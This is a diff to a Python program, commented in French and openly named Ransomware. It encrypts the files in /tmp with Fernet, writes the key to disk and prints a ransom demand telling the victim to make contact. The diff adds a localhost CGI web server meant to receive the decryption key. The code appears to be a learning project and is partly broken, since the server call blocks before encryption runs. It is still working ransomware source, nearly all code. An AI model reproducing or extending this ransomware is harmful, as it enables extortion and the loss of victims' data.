@@ -2,6 +2,8 @@ import os
 from os.path import expanduser
 from cryptography.fernet import Fernet
 import base64
+import http.server
+import requests
 
 class Ransomware:
 
@@ -100,12 +102,41 @@ class Ransomware:
             f.write(data)
 
 
+"""
+Le serveur hébergera la clé de déchiffrement envoyé par la victime.
+"""
+class Server:
+    """
+    def __init__(self, server_address, port):
+        self.port = port
+        self.server_address = server_address
+    """
+
+
+    def launch_server(self, state):
+        self.port = 8080
+        self.server_address = ("127.0.0.1", self.port) #Création d'un serveur web en localhost
+
+        server = http.server.HTTPServer
+        handler = http.server.CGIHTTPRequestHandler
+        handler.cgi_directories = ["/"]
+        print("Serveur actif sur le port :", self.port)
+        httpd = server(self.server_address, handler)
+
+        if state == True:
+            return httpd.serve_forever()
+        else:
+            return httpd.shutdown()
+
+    
 if __name__ == '__main__':
 
     local_tmp = '/tmp' # emplacement dossier à chiffrer
 
     #rware.generate_key()
     #rware.write_key()
+
+
 
     import argparse
     parser = argparse.ArgumentParser()
@@ -117,6 +148,7 @@ if __name__ == '__main__':
     keyfile = args.keyfile
 
     rware = Ransomware()
+    server = Server()
 
     if action == 'decrypt':
         if keyfile is None:
@@ -125,7 +157,17 @@ if __name__ == '__main__':
             rware.read_key(keyfile)
             rware.crypt_tmp(local_tmp, encrypted=True)
     else:
-        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp")    
+        server.launch_server(True) #Lancement du serveur Web
+
+        print("Vous avez été sujet à un ransomware, veuillez nous contacter pour espérer retrouver vos fichiers dans /tmp. \n NE RELANCEZ PAS LE MAIN SINON VIS FICHIERS SERONT PERDUS.")    
         rware.generate_key()
         rware.write_key('keyfile')
         rware.crypt_tmp(local_tmp)
+
+
+
+
+        #r = requests.get(url='127.0.0.1',param =)
+
+
+
